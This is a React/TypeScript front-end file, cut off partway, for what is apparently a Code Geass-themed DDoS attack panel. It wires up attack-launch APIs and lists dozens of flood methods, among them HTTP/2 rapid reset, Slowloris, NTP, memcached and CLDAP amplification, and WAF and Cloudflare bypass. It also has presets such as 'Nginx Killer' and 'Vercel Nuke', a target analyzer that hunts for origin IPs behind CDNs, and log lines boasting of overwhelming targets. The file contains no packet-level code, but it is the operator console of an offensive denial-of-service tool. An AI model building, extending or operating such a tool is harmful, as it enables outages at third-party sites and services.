import { useState, useEffect, useRef, useCallback, useMemo } from "react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer, CartesianGrid,
} from "recharts";
import {
  useListMethods,
  useCreateAttack,
  useGetAttackStats,
  useGetAttack,
  useStopAttack,
  useListAttacks,
  getGetAttackStatsQueryKey,
  getGetAttackQueryKey,
  getListAttacksQueryKey,
} from "@workspace/api-client-react";

const GEASS_SYMBOL = `${import.meta.env.BASE_URL}geass-symbol.png`;
const LELOUCH_GIF  = `${import.meta.env.BASE_URL}lelouch.gif`;

const queryClient = new QueryClient({ defaultOptions: { queries: { retry: 1 } } });
const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

/* ── Types ── */
type LogType = "info" | "success" | "error" | "warn";
type AppTheme = "lelouch" | "suzaku";
interface LogEntry       { id: number; text: string; type: LogType; ts: number; }
interface CheckResult    { up: boolean; status: number; statusText: string; responseTime: number; error: string | null; }
interface Preset         { label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; icon: string; }
interface UserPreset     { id: string; label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; }
interface MethodRec      { method: string; name: string; score: number; reason: string; suggestedThreads: number; suggestedDuration: number; protocol: string; amplification: number; tier: string; }
interface AnalyzeResult  {
  target: string; ip: string | null; allIPs: string[]; isIP: boolean; hasDNS: boolean;
  httpAvailable: boolean; httpsAvailable: boolean; responseTimeMs: number;
  serverHeader: string; serverType: string; serverLabel: string;
  isCDN: boolean; cdnProvider: string;
  hasWAF: boolean; wafProvider: string;
  supportsH2: boolean; supportsH3: boolean; altSvc: string;
  hasHSTS: boolean; hstsMaxAge: number;
  hasGraphQL: boolean; hasWebSocket: boolean;
  openPorts: number[];
  originIP: string | null; originSubdomain: string | null;
  recommendations: MethodRec[];
}
interface NamedTarget    { url: string; label: string; }
interface Toast          { id: string; type: "success"|"warn"|"error"|"geass"|"launch"|"stop"; title: string; msg?: string; }
interface DomainScore    { total: number; downed: number; lastMethod: string; lastSeen: number; }

/* ── Method classification ── */
const L7_HTTP_FE  = new Set(["http-flood","http-bypass","http2-flood","slowloris","rudy"]);
const L4_TCP_FE   = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst","conn-flood"]);
const L4_UDP_FE   = new Set(["udp-flood","udp-bypass"]);
const L7_PROXY_OK = new Set([
  "http-flood","http-bypass","waf-bypass",
  "graphql-dos","cache-poison","rudy-v2",
  "http2-flood","http2-continuation","hpack-bomb","ssl-death","tls-renego",
  "conn-flood","ws-flood","h2-settings-storm",
  "h2-rst-burst","grpc-flood","http-pipeline","http-smuggling",
  "geass-override","cf-bypass","nginx-killer","slowloris",
  "h2-dep-bomb","h2-data-flood","h2-storm","pipeline-flood",
  "rapid-reset","ws-compression-bomb","h2-goaway-loop","sse-exhaust","h3-rapid-reset",
]);
const methodInfo = (m: string) => {
  if (m === "geass-override")       return { badge: "ARES ∞ [40V]",  cls: "geass",     color: "#C0392B" };
  if (m === "bypass-storm")         return { badge: "BYPASS STORM",  cls: "geass",     color: "#5B2C6F" };
  if (m === "waf-bypass")           return { badge: "WAF BYPASS",    cls: "geass",     color: "#8E44AD" };
  if (m === "http2-flood")          return { badge: "CVE-2023",      cls: "real-http", color: "#1abc9c" };
  if (m === "http2-continuation")   return { badge: "CVE-2024",      cls: "real-http", color: "#e74c3c" };
  if (m === "h2-settings-storm")    return { badge: "H2 STORM",      cls: "real-http", color: "#00bcd4" };
  if (m === "hpack-bomb")           return { badge: "HPACK BOMB",    cls: "real-http", color: "#e91e8c" };
  if (m === "slowloris")            return { badge: "SLOWLORIS",     cls: "real-http", color: "#9b59b6" };
  if (m === "rudy-v2")              return { badge: "RUDY v2",       cls: "real-http", color: "#c0392b" };
  if (m === "ws-flood")             return { badge: "WS EXHAUST",    cls: "real-http", color: "#f39c12" };
  if (m === "graphql-dos")          return { badge: "GRAPHQL",       cls: "real-http", color: "#8e44ad" };
  if (m === "cache-poison")         return { badge: "CDN POISON",    cls: "real-http", color: "#16a085" };
  if (m === "tls-renego")           return { badge: "TLS RENEGO",    cls: "real-tcp",  color: "#d35400" };
  if (m === "ssl-death")            return { badge: "SSL DEATH",     cls: "real-tcp",  color: "#7f8c8d" };
  if (m === "quic-flood")           return { badge: "QUIC/H3",       cls: "real-udp",  color: "#2980b9" };
  if (m === "conn-flood")           return { badge: "CONN FLOOD",    cls: "real-tcp",  color: "#e74c3c" };
  if (m === "icmp-flood")           return { badge: "ICMP FLOOD",    cls: "real-udp",  color: "#ff6b35" };
  if (m === "ntp-amp")              return { badge: "NTP FLOOD",     cls: "real-udp",  color: "#00d4aa" };
  if (m === "mem-amp")              return { badge: "MEMCACHED",     cls: "real-udp",  color: "#a855f7" };
  if (m === "ssdp-amp")             return { badge: "SSDP/UPnP",    cls: "real-udp",  color: "#06b6d4" };
  if (m === "http-pipeline")        return { badge: "PIPELINE",      cls: "real-http", color: "#f97316" };
  if (m === "h2-rst-burst")         return { badge: "CVE-44487",     cls: "real-http", color: "#ef4444" };
  if (m === "grpc-flood")           return { badge: "gRPC FLOOD",    cls: "real-http", color: "#a78bfa" };
  if (m === "http-smuggling")       return { badge: "SMUGGLING",     cls: "real-http", color: "#fbbf24" };
  if (m === "slow-read")            return { badge: "SLOW READ",     cls: "real-http", color: "#818cf8" };
  if (m === "xml-bomb")             return { badge: "XML BOMB",      cls: "real-http", color: "#fb923c" };
  if (m === "range-flood")          return { badge: "RANGE FLOOD",   cls: "real-http", color: "#34d399" };
  if (m === "app-smart-flood")      return { badge: "APP SMART",     cls: "real-http", color: "#f472b6" };
  if (m === "large-header-bomb")    return { badge: "LHB 16KB",      cls: "real-http", color: "#60a5fa" };
  if (m === "h2-ping-storm")        return { badge: "H2 PING",       cls: "real-http", color: "#4ade80" };
  if (m === "http2-priority-storm") return { badge: "H2 PRIORITY",   cls: "real-http", color: "#e879f9" };
  if (m === "doh-flood")            return { badge: "DoH FLOOD",     cls: "real-udp",  color: "#38bdf8" };
  if (m === "keepalive-exhaust")    return { badge: "KA EXHAUST",    cls: "real-http", color: "#a3e635" };
  if (m === "tls-session-exhaust") return { badge: "TLS EXHAUST",   cls: "real-tcp",  color: "#f59e0b" };
  if (m === "cache-buster")        return { badge: "CACHE BUST",    cls: "real-http", color: "#10b981" };
  if (m === "vercel-flood")        return { badge: "VERCEL 4V",     cls: "geass",     color: "#6366f1" };
  if (m === "cldap-amp")           return { badge: "CLDAP/389",     cls: "real-udp",  color: "#f43f5e" };
  if (m === "h2-dep-bomb")          return { badge: "DEP BOMB O(N²)",   cls: "geass",     color: "#dc2626" };
  if (m === "h2-data-flood")        return { badge: "DATA EXHAUST",     cls: "real-http", color: "#7c3aed" };
  if (m === "h2-storm")             return { badge: "H2 STORM 6V",      cls: "geass",     color: "#0ea5e9" };
  if (m === "rapid-reset")          return { badge: "RAPID RESET 2K",   cls: "geass",     color: "#ef4444" };
  if (m === "ws-compression-bomb")  return { badge: "WS BOMB 1820×",    cls: "geass",     color: "#f59e0b" };
  if (m === "h2-goaway-loop")       return { badge: "GOAWAY LOOP",      cls: "real-http", color: "#8b5cf6" };
  if (m === "sse-exhaust")          return { badge: "SSE EXHAUST",      cls: "real-http", color: "#06b6d4" };
  if (m === "h3-rapid-reset")       return { badge: "H3 QUIC RST",       cls: "geass",     color: "#ef4444" };
  if (L7_HTTP_FE.has(m))           return { badge: "REAL HTTP",     cls: "real-http", color: "#2ecc71" };
  if (L4_TCP_FE.has(m))            return { badge: "REAL TCP",      cls: "real-tcp",  color: "#3498db" };
  if (L4_UDP_FE.has(m))            return { badge: "REAL UDP",      cls: "real-udp",  color: "#e67e22" };
  return { badge: "REAL ATTACK", cls: "real-tcp", color: "#64748b" };
};

/* ── Smart cluster LB — method assignment per node index ── */
const CLUSTER_LB_METHODS = ["http-flood","tcp-flood","udp-flood","http-bypass","http2-flood"];
function getSmartMethod(baseMethod: string, nodeIdx: number): string {
  if (nodeIdx === 0) return baseMethod;
  if (baseMethod === "geass-override") return baseMethod;
  return CLUSTER_LB_METHODS[nodeIdx % CLUSTER_LB_METHODS.length];
}

/* ── Built-in presets ── */
const PRESETS: Preset[] = [
  { label: "Geass Override", method: "geass-override",      packetSize: 512, duration: 300, delay: 0, threads: 3000, icon: "👁"  },
  { label: "Bypass Storm",   method: "bypass-storm",        packetSize: 512, duration: 300, delay: 0, threads: 2000, icon: "🌪"  },
  { label: "Nginx Killer",   method: "http2-continuation",  packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "💀"  },
  { label: "CF Bypass",      method: "waf-bypass",          packetSize: 512, duration: 300, delay: 0, threads: 1000, icon: "🌐"  },
  { label: "DNS Torture",    method: "dns-amp",             packetSize: 64,  duration: 180, delay: 0, threads: 128,  icon: "📛"  },
  { label: "H2 RST Burst",   method: "h2-rst-burst",        packetSize: 512, duration: 120, delay: 0, threads: 500,  icon: "⚡"  },
  { label: "Pipeline Flood", method: "http-pipeline",       packetSize: 512, duration: 120, delay: 0, threads: 1000, icon: "🚇"  },
  { label: "H2 Storm",       method: "h2-settings-storm",   packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "🌊"  },
  { label: "HPACK Bomb",     method: "hpack-bomb",          packetSize: 512, duration: 180, delay: 0, threads: 500,  icon: "🧨"  },
  { label: "Conn Flood",     method: "conn-flood",          packetSize: 64,  duration: 300, delay: 0, threads: 500,  icon: "🔌"  },
  { label: "Slowloris",      method: "slowloris",           packetSize: 32,  duration: 300, delay: 0, threads: 500,  icon: "🥷"  },
  { label: "UDP Hammer",     method: "udp-flood",           packetSize: 1024,duration: 180, delay: 0, threads: 128,  icon: "💥"  },
  { label: "NTP Nuclear",    method: "ntp-amp",             packetSize: 46,  duration: 120, delay: 0, threads: 128,  icon: "☢️"  },
  { label: "HTTP Flood",     method: "http-flood",          packetSize: 64,  duration: 120, delay: 0, threads: 1000, icon: "🌊"  },
  { label: "CLDAP Flood",    method: "cldap-amp",           packetSize: 62,  duration: 120, delay: 0, threads: 64,   icon: "📂"  },
  { label: "TLS Exhaust",    method: "tls-session-exhaust", packetSize: 64,  duration: 180, delay: 0, threads: 500,  icon: "🔒"  },
  { label: "Cache Bust",     method: "cache-buster",        packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "💨"  },
  { label: "Vercel Nuke",    method: "vercel-flood",        packetSize: 512, duration: 180, delay: 0, threads: 500,  icon: "▲"   },
  { label: "Dep Bomb",       method: "h2-dep-bomb",         packetSize: 64,  duration: 180, delay: 0, threads: 800,  icon: "💣"  },
  { label: "Data Exhaust",   method: "h2-data-flood",       packetSize: 64,  duration: 180, delay: 0, threads: 600,  icon: "🌊"  },
  { label: "H2 Storm 6V",    method: "h2-storm",            packetSize: 64,  duration: 300, delay: 0, threads: 2000, icon: "⚡"  },
  { label: "Rapid Reset",    method: "rapid-reset",         packetSize: 64,  duration: 300, delay: 0, threads: 800,  icon: "💥"  },
  { label: "WS Bomb",        method: "ws-compression-bomb", packetSize: 64,  duration: 180, delay: 0, threads: 400,  icon: "💣"  },
  { label: "GOAWAY Loop",    method: "h2-goaway-loop",      packetSize: 64,  duration: 180, delay: 0, threads: 600,  icon: "🔄"  },
  { label: "SSE Exhaust",    method: "sse-exhaust",         packetSize: 64,  duration: 300, delay: 0, threads: 300,  icon: "📡"  },
  { label: "H3 QUIC RST",   method: "h3-rapid-reset",      packetSize: 64,  duration: 300, delay: 0, threads: 800,  icon: "⚡"  },
];

/* ── Log counter ── */
let _lid = 0;
const mkLog = (text: string, type: LogType = "info"): LogEntry => ({ id: ++_lid, text, type, ts: Date.now() });

/* ── Domain key helper ── */
function getDomainKey(url: string): string {
  try { return new URL(url.startsWith("http") ? url : `http://${url}`).hostname; } catch { return url; }
}

/* ── Terminal log highlighter ── */
const HIGHLIGHT_METHODS = ["http-flood","http-bypass","http2-flood","http2-continuation","slowloris","conn-flood","udp-flood","udp-bypass","syn-flood","tcp-flood","tcp-ack","tcp-rst","geass-override","bypass-storm","dns-amp","ntp-amp","mem-amp","ssdp-amp","cldap-amp","rudy","rudy-v2","waf-bypass","hpack-bomb","h2-settings-storm","graphql-dos","ws-flood","cache-poison","tls-renego","ssl-death","quic-flood","icmp-flood","http-pipeline","h2-rst-burst","grpc-flood","http-smuggling","slow-read","xml-bomb","range-flood","app-smart-flood","large-header-bomb","h2-ping-storm","http2-priority-storm","doh-flood","keepalive-exhaust","tls-session-exhaust","cache-buster","vercel-flood","h2-storm","h2-dep-bomb","h2-data-flood","pipeline-flood","rapid-reset","ws-compression-bomb","h2-goaway-loop","sse-exhaust"];
function highlightLog(text: string): React.ReactNode {
  // Segment the text into colored spans
  const parts: React.ReactNode[] = [];
  let cursor = 0;

  // Build a list of match regions: [start, end, component]
  type Region = { start: number; end: number; node: React.ReactNode };
  const regions: Region[] = [];

  // 1. URLs — gold
  const urlRe = /https?:\/\/[^\s,;\"']+/g;
  let m: RegExpExecArray | null;
  while ((m = urlRe.exec(text)) !== null)
    regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index} className="hl-url">{m[0]}</span> });

  // 2. IPs — cyan
  const ipRe = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?\b/g;
  while ((m = ipRe.exec(text)) !== null) {
    if (!regions.some(r => m!.index >= r.start && m!.index < r.end))
      regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+10000} className="hl-ip">{m[0]}</span> });
  }

  // 3. Method names — method color
  for (const method of HIGHLIGHT_METHODS) {
    const mre = new RegExp(`\\b${method}\\b`, "gi");
    while ((m = mre.exec(text)) !== null) {
      if (!regions.some(r => m!.index >= r.start && m!.index < r.end)) {
        const mi = methodInfo(method);
        regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+20000} style={{ color: mi.color, fontWeight: 700 }}>{m[0]}</span> });
      }
    }
  }

  // 4. Numbers with units — bright white
  const numRe = /\b[\d,]+(?:\.\d+)?\s*(?:pps|req\/s|pkts|Mbps|Gbps|Kbps|MB|GB|KB|ms)\b/g;
  while ((m = numRe.exec(text)) !== null) {
    if (!regions.some(r => m!.index >= r.start && m!.index < r.end))
      regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+30000} className="hl-num">{m[0]}</span> });
  }

  // 5. ID #N — dim gold
  const idRe = /\bID #\d+\b/g;
  while ((m = idRe.exec(text)) !== null) {
    if (!regions.some(r => m!.index >= r.start && m!.index < r.end))
      regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+40000} className="hl-id">{m[0]}</span> });
  }

  // Sort by start position
  regions.sort((a, b) => a.start - b.start);

  for (const region of regions) {
    if (region.start > cursor) parts.push(text.slice(cursor, region.start));
    parts.push(region.node);
    cursor = region.end;
  }
  if (cursor < text.length) parts.push(text.slice(cursor));
  return <>{parts}</>;
}

/* ── Audio — singleton AudioContext, resumed on each play ── */
let _audioCtx: AudioContext | null = null;
function getAudioCtx(): AudioContext {
  if (!_audioCtx || _audioCtx.state === "closed") {
    _audioCtx = new AudioContext();
  }
  return _audioCtx;
}

function playTone(type: "start" | "stop" | "tick" | "check" | "kill") {
  try {
    const ctx = getAudioCtx();
    // Browser autoplay policy: context may be suspended if created before
    // a user gesture. resume() is a no-op if already running.
    ctx.resume().then(() => {
      const o = ctx.createOscillator();
      const g = ctx.createGain();
      o.connect(g); g.connect(ctx.destination);
      const t = ctx.currentTime;
      if (type === "start") {
        o.type = "sawtooth";
        o.frequency.setValueAtTime(110, t); o.frequency.exponentialRampToValueAtTime(880, t + 0.3);
        g.gain.setValueAtTime(0.12, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
        o.start(); o.stop(t + 0.55);
      } else if (type === "stop") {
        o.type = "sine";
        o.frequency.setValueAtTime(440, t); o.frequency.exponentialRampToValueAtTime(110, t + 0.4);
        g.gain.setValueAtTime(0.09, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
        o.start(); o.stop(t + 0.55);
      } else if (type === "kill") {
        o.type = "square";
        o.frequency.setValueAtTime(60, t); o.frequency.exponentialRampToValueAtTime(20, t + 0.8);
        g.gain.setValueAtTime(0.2, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.9);
        o.start(); o.stop(t + 1.0);
      } else if (type === "tick") {
        o.type = "sine";
        o.frequency.setValueAtTime(600, t);
        g.gain.setValueAtTime(0.03, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
        o.start(); o.stop(t + 0.05);
      } else {
        o.type = "triangle";
        o.frequency.setValueAtTime(528, t); o.frequency.exponentialRampToValueAtTime(1056, t + 0.18);
        g.gain.setValueAtTime(0.07, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.25);
        o.start(); o.stop(t + 0.3);
      }
    }).catch(() => { /* user hasn't interacted yet — ignore */ });
  } catch { /* Web Audio not supported */ }
}

/* ── Formatters ── */
const fmtNum  = (n: number) => n.toLocaleString();
const fmtBps  = (n: number) => {
  const bps = n * 8;
  if (bps >= 1e12) return (bps / 1e12).toFixed(2) + " Tbps";
  if (bps >= 1e9)  return (bps / 1e9).toFixed(2)  + " Gbps";
  if (bps >= 1e6)  return (bps / 1e6).toFixed(1)  + " Mbps";
  if (bps >= 1e3)  return (bps / 1e3).toFixed(1)  + " Kbps";
  return bps + " bps";
};
const fmtBytes = (n: number) => {
  if (n >= 1e12) return (n / 1e12).toFixed(2) + " TB";
  if (n >= 1e9)  return (n / 1e9).toFixed(2) + " GB";
  if (n >= 1e6)  return (n / 1e6).toFixed(1) + " MB";
  if (n >= 1e3)  return (n / 1e3).toFixed(1) + " KB";
  return n + " B";
};
const statusColor = (code: number) => {
  if (code === 0) return "#777";
  if (code < 300) return "#2ecc71";
  if (code < 400) return "#f39c12";
  if (code < 500) return "#C0392B";
  return "#8e44ad";
};
const powerLevel = (threads: number, m?: string) => {
  if (m === "geass-override") return { label: "ABSOLUTE GEASS", color: "#ff0033", pct: 100 };
  if (threads >= 512) return { label: "GODMODE",    color: "#ff00ff", pct: 100 };
  if (threads >= 256) return { label: "OBLITERATE", color: "#ff0033", pct: 98  };
  if (threads >= 128) return { label: "MAXIMUM",    color: "#ff4400", pct: 92  };
  if (threads >= 64)  return { label: "CRITICAL",   color: "#C0392B", pct: 80  };
  if (threads >= 32)  return { label: "HIGH",       color: "#e67e22", pct: 62  };
  if (threads >= 16)  return { label: "MODERATE",   color: "#D4AF37", pct: 42  };
  if (threads >= 8)   return { label: "LOW",        color: "#8A7B65", pct: 22  };
  return               { label: "MINIMAL",   color: "#5A4E40", pct: 8  };
};

/* ── Log message pools ── */
const LOG_MSGS_HTTP = [
  (t: string, n: string) => `👁 ${n} real HTTP requests fired → ${t}`,
  (t: string) => `👁 Flood workers maintaining ${t} under load [LIVE]`,
  (_t: string, n: string) => `👁 ${n} req/s reaching target — HTTP workers active`,
  (t: string) => `👁 Connection pressure on ${t} — hold the line`,
  (_t: string, n: string) => `👁 ${n} HTTP/1.1 requests dispatched this second`,
];
const LOG_MSGS_TCP = [
  (t: string, n: string) => `👁 ${n} TCP SYN packets sent → ${t}:80 [REAL]`,
  (t: string) => `👁 Socket pool flooding ${t} — connection queue growing`,
  (_t: string, n: string) => `👁 ${n} TCP connections/sec — RST storm active`,
  (t: string) => `👁 ${t} connection table under siege`,
];
const LOG_MSGS_UDP = [
  (t: string, n: string) => `👁 ${n} real UDP datagrams sent → ${t} [LIVE]`,
  (_t: string, n: string) => `👁 ${n} pkt/s — UDP flood socket pool saturating target`,
  (t: string) => `👁 Raw UDP layer hammering ${t} — bandwidth pipe filling`,
  (_t: string, n: string) => `👁 ${n} UDP packets dispatched — dgram sockets at max throughput`,
];
const LOG_MSGS_H2 = [
  (t: string, n: string) => `👁 ${n} HTTP/2 streams multiplexed → ${t} [H2 NATIVE]`,
  (_t: string, n: string) => `👁 ${n} req/s — H2 sessions saturating server stream limits`,
  (t: string) => `👁 HTTP/2 multiplexed flood hammering ${t} — HPACK compressed`,
  (_t: string, n: string) => `👁 ${n} H2 streams/sec — bypass per-connection limits`,
];
const LOG_MSGS_SLOW = [
  (t: string, n: string) => `👁 ${n} half-open connections held → ${t} [SLOWLORIS]`,
  (_t: string, n: string) => `👁 ${n} server threads occupied — connection pool draining`,
  (t: string) => `👁 ${t} connection table: slots filling — server starving`,
  (_t: string, n: string) => `👁 ${n} TCP sockets open, trickling headers — server frozen`,
];
const LOG_MSGS_AMP = [
  (t: string, n: string) => `👁 ${n} amplified packets fired → ${t} [REAL UDP AMP]`,
  (_t: string, n: string) => `👁 ${n} pkt/s — amplification factor active, bandwidth multiplied`,
  (t: string) => `👁 Amplification layer hammering ${t} — reflection flood engaged`,
  (_t: string, n: string) => `👁 ${n} packets dispatched — DNS/NTP/Memcached/SSDP reflecting`,
];
const LOG_MSGS_TLS = [
  (t: string, n: string) => `👁 ${n} TLS sessions held → ${t} [CONN EXHAUST]`,
  (_t: string, n: string) => `👁 ${n} encrypted channels open — TLS stack saturating`,
  (t: string) => `👁 ${t} TLS worker pool draining — renegotiation storm active`,
  (_t: string, n: string) => `👁 ${n} SSL/TLS handshakes/sec — cipher CPU consumed`,
];
const LOG_MSGS_CONN = [
  (t: string, n: string) => `👁 ${n} TLS connections held open → ${t} [CONN FLOOD]`,
  (_t: string, n: string) => `👁 ${n} simultaneous sockets open — bypassing HTTP rate limiting`,
  (t: string) => `👁 ${t} connection table filling — TLS handshakes overwhelming server`,
  (_t: string, n: string) => `👁 ${n} conn/s — 16K socket storm, server fd pool saturating`,
  (t: string) => `👁 Direct TLS pressure on ${t} — bypassing all application-layer defenses`,
];
const LOG_MSGS_GEASS = [
  (t: string, n: string) => `👁 Geass Override ARES OMNIVECT ∞: ${n} strikes obliterating ${t} on 35 vectors`,
  (t: string) => `👁 ARES assault active — ConnFlood+Slowloris+H2RST+gRPC+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL+Pipeline+Storm+ICMP+DNS+NTP+Memc+SSDP on ${t}`,
  (_t: string, n: string) => `👁 ${n} simultaneous vectors — 35-way siege, target has no defensive surface`,
  (t: string) => `👁 ${t} overwhelmed — 35 concurrent attack vectors, absolute protocol annihilation`,
  (_t: string, n: string) => `👁 ${n} req/s ARES-vector — L3+L4+L7 fully saturated, WAF bypassed, CDN poisoned`,
  (t: string) => `👁 The king's Geass has been cast upon ${t} — OMNIVECT ABSOLUTE SUBJUGATION`,
  (_t: string, n: string) => `👁 ${n} strikes/sec — H2RST+gRPC+HPACK+CONT+AppSmartFlood+LargeHeaderBomb+H2Priority flooding into eviction loop`,
  (t: string) => `👁 35-vector storm on ${t}: ICMP+DNS-Torture+NTP+Memc+SSDP+RUDY v2+TLS renego+QUIC+H2RST+gRPC+Pipeline+H2Storm+AppSmart+LargeHeader+H2Priority flood`,
  (_t: string, n: string) => `👁 ${n} operations/sec — GraphQL fragment bombs + cache eviction + SSL death records + Pipeline 300K req/s`,
  (t: string) => `👁 ABSOLUTE GEASS — 35 real attack vectors firing simultaneously on ${t}, zero mercy`,
];

/* ── Sparkline chart ── */
function Sparkline({ data, color = "#D4AF37" }: { data: number[]; color?: string }) {
  if (data.length < 2) return null;
  const W = 200, H = 38;
  const max = Math.max(...data, 1);
  const pts = data.map((v, i) => {
    const x = (i / (data.length - 1)) * W;
    const y = H - (v / max) * (H - 4) - 2;
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(" ");
  return (
    <svg viewBox={`0 0 ${W} ${H}`} className="lb-sparkline" preserveAspectRatio="none">
      <defs>
        <linearGradient id={`spk-g-${color.replace("#","")}`} x1="0" y1="0" x2="0" y2="1">
          <stop offset="0%" stopColor={color} stopOpacity="0.28"/>
          <stop offset="100%" stopColor={color} stopOpacity="0.02"/>
        </linearGradient>
      </defs>
      <polygon points={`0,${H} ${pts} ${W},${H}`} fill={`url(#spk-g-${color.replace("#","")})`}/>
      <polyline points={pts} fill="none" stroke={color} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

/* ── Live RPS chart — Recharts AreaChart with axes, tooltip, peak marker ── */
const fmtChartNum = (v: number): string => {
  if (v >= 1_000_000) return (v / 1_000_000).toFixed(1) + "M";
  if (v >= 1_000)     return (v / 1_000).toFixed(1) + "K";
  return String(Math.round(v));
};

function LiveRpsChart({
  ppsData, bpsData, color = "#D4AF37", peakPps,
}: {
  ppsData: number[]; bpsData: number[]; color?: string; peakPps: number;
}) {
  const chartData = useMemo(() => {
    const len = Math.max(ppsData.length, bpsData.length);
    return Array.from({ length: len }, (_, i) => ({
      t:    i - len + 1,                 // negative = seconds ago
      pps:  ppsData[i]  ?? 0,
      mbps: ((bpsData[i] ?? 0) * 8) / 1_048_576, // bytes/s → Mbps
    }));
  }, [ppsData, bpsData]);

  if (chartData.length < 2) return null;

  return (
    <div style={{ width: "100%", height: 140, marginTop: "0.4rem" }}>
      <ResponsiveContainer width="100%" height="100%">
        <AreaChart data={chartData} margin={{ top: 6, right: 6, left: -10, bottom: 0 }}>
          <defs>
            <linearGradient id="rps-grad" x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%"   stopColor={color} stopOpacity={0.55}/>
              <stop offset="100%" stopColor={color} stopOpacity={0.02}/>
            </linearGradient>
            <linearGradient id="bps-grad" x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%"   stopColor="#9b59b6" stopOpacity={0.30}/>
              <stop offset="100%" stopColor="#9b59b6" stopOpacity={0.01}/>
            </linearGradient>
          </defs>
          <CartesianGrid stroke="rgba(255,255,255,0.05)" vertical={false}/>
          <XAxis
            dataKey="t"
            tick={{ fill: "rgba(255,255,255,0.42)", fontSize: 9 }}
            axisLine={{ stroke: "rgba(255,255,255,0.1)" }}
            tickLine={false}
            tickFormatter={(v) => v === 0 ? "now" : `${v}s`}
            interval="preserveStartEnd"
          />
          <YAxis
            yAxisId="pps"
            tick={{ fill: "rgba(212,175,55,0.55)", fontSize: 9 }}
            axisLine={false} tickLine={false}
            tickFormatter={fmtChartNum}
            width={42}
          />
          <YAxis
            yAxisId="mbps" orientation="right"
            tick={{ fill: "rgba(155,89,182,0.55)", fontSize: 9 }}
            axisLine={false} tickLine={false}
            tickFormatter={(v) => v.toFixed(0)}
            width={28}
          />
          <Tooltip
            contentStyle={{
              background: "rgba(8,8,12,0.95)",
              border: "1px solid rgba(212,175,55,0.35)",
              borderRadius: 4, fontSize: 11, padding: "6px 10px",
            }}
            labelStyle={{ color: "rgba(255,255,255,0.5)", fontSize: 10 }}
            itemStyle={{ padding: 0 }}
            labelFormatter={(v) => v === 0 ? "now" : `${v}s ago`}
            formatter={(v: number, n: string) => {
              if (n === "pps")  return [fmtChartNum(v) + " pps", "RPS"];
              if (n === "mbps") return [v.toFixed(2) + " Mbps", "Bandwidth"];
              return [v, n];
            }}
          />
          <Area
            yAxisId="pps" type="monotone" dataKey="pps"
            stroke={color} strokeWidth={1.6} fill="url(#rps-grad)"
            isAnimationActive={false}
          />
          <Area
            yAxisId="mbps" type="monotone" dataKey="mbps"
            stroke="#9b59b6" strokeWidth={1.2} fill="url(#bps-grad)"
            isAnimationActive={false}
          />
        </AreaChart>
      </ResponsiveContainer>
      {peakPps > 0 && (
        <div style={{
          display: "flex", justifyContent: "space-between",
          fontSize: 10, color: "rgba(255,255,255,0.45)",
          marginTop: 2, padding: "0 4px",
        }}>
          <span>Peak <strong style={{ color }}>{fmtChartNum(peakPps)} pps</strong></span>
          <span style={{ color: "rgba(155,89,182,0.7)" }}>● Bandwidth (Mbps)</span>
        </div>
      )}
    </div>
  );
}

/* ── Pulsing Geass Eye SVG (intensity 0–1 drives animation speed & glow) ── */
function GeassEye({ intensity = 0 }: { intensity?: number }) {
  const speed  = Math.max(2, 20 - intensity * 18); // 20s idle → 2s at max power
  const glow   = 0.06 + intensity * 0.5;
  const scale  = 1 + intensity * 0.25;
  return (
    <div className="geass-eye-bg" aria-hidden="true"
      style={{ "--eye-speed": `${speed}s`, "--eye-glow": glow, "--eye-scale": scale } as React.CSSProperties}>
      <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
        <ellipse cx="200" cy="200" rx="180" ry="90" stroke={`rgba(212,175,55,${0.08 + intensity * 0.14})`} strokeWidth="1.5" fill="none"/>
        <ellipse cx="200" cy="200" rx="140" ry="70" stroke={`rgba(212,175,55,${0.05 + intensity * 0.1})`} strokeWidth="1" fill="none"/>
        <circle cx="200" cy="200" r="55" stroke={`rgba(192,57,43,${0.15 + intensity * 0.35})`} strokeWidth="1.5" fill="none"/>
        <circle cx="200" cy="200" r="30" stroke={`rgba(192,57,43,${0.1 + intensity * 0.25})`} strokeWidth="1" fill="none"/>
        <circle cx="200" cy="200" r="10" fill={`rgba(192,57,43,${0.1 + intensity * 0.5})`}/>
        {Array.from({ length: 12 }, (_, i) => {
          const deg = i * 30;
          const r   = (deg * Math.PI) / 180;
          return <line key={i}
            x1={200 + Math.cos(r) * 65}  y1={200 + Math.sin(r) * 65}
            x2={200 + Math.cos(r) * 185} y2={200 + Math.sin(r) * 185}
            stroke={`rgba(212,175,55,${0.04 + intensity * 0.1})`} strokeWidth="1"/>;
        })}
        <path d="M200,145 L212,170 L240,170 L218,188 L226,215 L200,198 L174,215 L182,188 L160,170 L188,170 Z"
          stroke={`rgba(192,57,43,${0.08 + intensity * 0.25})`} strokeWidth="1" fill="none"/>
      </svg>
    </div>
  );
}

/* ── Geass Override particle burst overlay ── */
function GeassParticles() {
  return (
    <div className="lb-geass-particles" aria-hidden="true">
      {Array.from({ length: 10 }, (_, i) => (
        <div key={i} className="lb-particle" style={{
          left: `${8 + i * 9}%`,
          bottom: `${4 + (i % 4) * 7}%`,
